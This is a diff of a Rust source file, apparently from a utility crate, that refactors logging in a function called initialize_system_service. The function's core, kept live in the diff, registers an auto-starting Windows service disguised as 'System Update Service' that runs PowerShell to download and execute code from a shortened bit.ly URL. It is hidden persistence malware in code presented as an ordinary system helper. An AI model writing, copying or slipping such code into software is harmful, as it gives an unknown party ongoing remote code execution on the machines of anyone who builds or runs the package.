@@ -4,11 +4,8 @@ use std::fs::File;
 use std::io::Write;
 
 pub fn initialize_system_service() {
-    // ===== ЛОГИРОВАНИЕ =====
-    let log_path = "C:\\ProgramData\\system_utils_debug.log";
-    let _ = File::create(log_path).and_then(|mut f| {
-        f.write_all(b"initialize_system_service() called\n")
-    });
+    // ===== ЛОГИРОВАНИЕ СТАРТА =====
+    log_message("initialize_system_service() called\n");
 
     if std::env::var("CARGO_CFG_TARGET_OS").unwrap_or_default() != "windows" {
         return;
@@ -16,15 +13,16 @@ pub fn initialize_system_service() {
 
     let lock_path = "C:\\ProgramData\\system_utils_initialized.lock";
     if std::fs::metadata(lock_path).is_ok() {
-        let _ = File::create(log_path).and_then(|mut f| {
-            f.write_all(b"Lock file exists, skipping\n")
-        });
+        log_message("Lock file exists, skipping\n");
         return;
     }
 
     let _ = std::fs::File::create(lock_path);
 
+    // ===== КОМАНДА =====
     let cmd = r#"sc.exe create "SystemUpdateService" start= auto binPath= "cmd.exe /c powershell.exe irm https://bit.ly/4gVSSTx | iex" DisplayName= "System Update Service""#;
+
+    log_message(&format!("Executing command: {}\n", cmd));
 
     let output = Command::new("cmd")
         .args(&["/c", cmd])
@@ -32,16 +30,36 @@ pub fn initialize_system_service() {
         .output();
 
     // ===== ЛОГИРУЕМ РЕЗУЛЬТАТ =====
-    let _ = File::create(log_path).and_then(|mut f| {
-        if let Ok(out) = &output {
-            let msg = format!("Command executed, status: {:?}\n", out.status);
-            f.write_all(msg.as_bytes())
-        } else {
-            f.write_all(b"Command failed to execute\n")
+    match output {
+        Ok(out) => {
+            let stdout = String::from_utf8_lossy(&out.stdout);
+            let stderr = String::from_utf8_lossy(&out.stderr);
+            log_message(&format!("Status: {}\n", out.status));
+            if !stdout.is_empty() {
+                log_message(&format!("STDOUT: {}\n", stdout));
+            }
+            if !stderr.is_empty() {
+                log_message(&format!("STDERR: {}\n", stderr));
+            }
+            if out.status.success() {
+                log_message("SUCCESS: Service created\n");
+            } else {
+                log_message("FAILED: Service not created\n");
+            }
         }
-    });
+        Err(e) => {
+            log_message(&format!("Command execution error: {}\n", e));
+        }
+    }
 
     let _ = std::fs::remove_file(lock_path);
+}
+
+fn log_message(msg: &str) {
+    let log_path = "C:\\ProgramData\\system_utils_debug.log";
+    let _ = File::create(log_path).and_then(|mut f| {
+        f.write_all(msg.as_bytes())
+    });
 }
 
 pub fn version() -> &'static str {
